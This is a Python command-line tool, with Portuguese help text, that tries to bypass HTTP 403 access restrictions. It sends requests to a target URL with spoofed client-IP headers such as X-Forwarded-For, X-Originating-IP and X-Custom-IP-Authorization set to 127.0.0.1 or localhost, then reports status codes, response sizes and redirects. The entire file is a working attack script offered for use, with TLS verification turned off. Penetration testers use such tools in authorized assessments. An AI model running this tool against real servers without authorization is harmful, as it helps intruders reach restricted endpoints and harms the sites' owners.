#!/usr/bin/env python3
import requests
import urllib3
import argparse
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BYPASS_IP = "127.0.0.1"

HEADERS_TO_TEST = [
    "Forwarded",
    "Forwarded-For",
    "Forwarded-For-Ip",
    "X-Client-IP",
    "X-Custom-IP-Authorization",
    "X-Forward",
    "X-Forwarded",
    "X-Forwarded-By",
    "X-Forwarded-For",
    "X-Forwarded-For-Original",
    "X-Forwared-Host",
    "X-Host",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
]

LOCAL_HEADERS = [
    "Forwarded",
    "Forwarded-For",
    "X-Forward",
    "X-Forwarded",
    "X-Forwarded-By",
    "X-Forwarded-For",
    "X-Forwarded-For-Original",
    "X-Forwared-Host",
    "X-Host",
    "X-Remote-Addr",
    "X-Forwarded-Server"
]


def print_banner():
    print("\033[1;36m" + "╔" + "═" * 70 + "╗")
    print("║{:^70}║".format("RESULTADOS COLETADOS"))
    print("╚" + "═" * 70 + "╝" + "\033[0m")


def send_request(url, header_name, value, method="GET", extra_headers=None, body=None):
    try:
        headers = {header_name: value}

        if extra_headers:
            headers.update(extra_headers)

        if method == "POST":
            response = requests.post(
                url,
                headers=headers,
                data=body if body else "",
                verify=False,
                timeout=5,
                allow_redirects=True
            )
        else:
            response = requests.get(
                url,
                headers=headers,
                verify=False,
                timeout=5,
                allow_redirects=True
            )

        size = len(response.content)
        status = response.status_code

        if status < 300:
            color = "🟩"
        elif status < 400:
            color = "🟦"
        else:
            color = "🟥"

        redirect_to = ""
        if 300 <= status < 400:
            try:
                if method == "POST":
                    first = requests.post(
                        url,
                        headers=headers,
                        data=body if body else "",
                        verify=False,
                        timeout=5,
                        allow_redirects=False
                    )
                else:
                    first = requests.get(
                        url,
                        headers=headers,
                        verify=False,
                        timeout=5,
                        allow_redirects=False
                    )
                loc = first.headers.get("Location")
                if loc:
                    redirect_to = f" -> {loc}"
            except:
                pass

        print(f"{color} {status} | {size} bytes | {header_name}: {value}{redirect_to}")

    except Exception:
        print(f"🟥 ERR | 0 bytes | {header_name}: {value}")


def parse_extra_headers(headers_list):
    parsed = {}
    for h in headers_list:
        if ":" not in h:
            print(f"[!] Header inválido (use Chave: Valor): {h}")
            continue
        key, value = h.split(":", 1)
        parsed[key.strip()] = value.strip()
    return parsed


def main():
    parser = argparse.ArgumentParser(
        prog="bypass.py",
        description="Ferramenta para bypass 403 via headers.",
        usage="python3 bypass.py <url> [opções]",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument("url", nargs="?", help="URL alvo")
    parser.add_argument("-X", "--method", choices=["GET", "POST"], default="GET",
                        help="Método HTTP (GET ou POST)")
    parser.add_argument("-H", "--header", action="append", default=[],
                        help='Adicionar header customizado. Ex: -H "Header: test"')
    parser.add_argument("-d", "--data", help='Enviar body no método POST. Ex: -d "user=admin&pass=123"')

    args = parser.parse_args()

    if not args.url:
        parser.print_help()
        sys.exit(1)

    url = args.url
    if not url.startswith("http"):
        url = "http://" + url

    body = args.data
    extra_headers = parse_extra_headers(args.header)

    print_banner()

    for h in HEADERS_TO_TEST:
        send_request(url, h, "127.0.0.1", method=args.method, extra_headers=extra_headers, body=body)

    for h in LOCAL_HEADERS:
        send_request(url, h, "localhost", method=args.method, extra_headers=extra_headers, body=body)


if __name__ == "__main__":
    main()
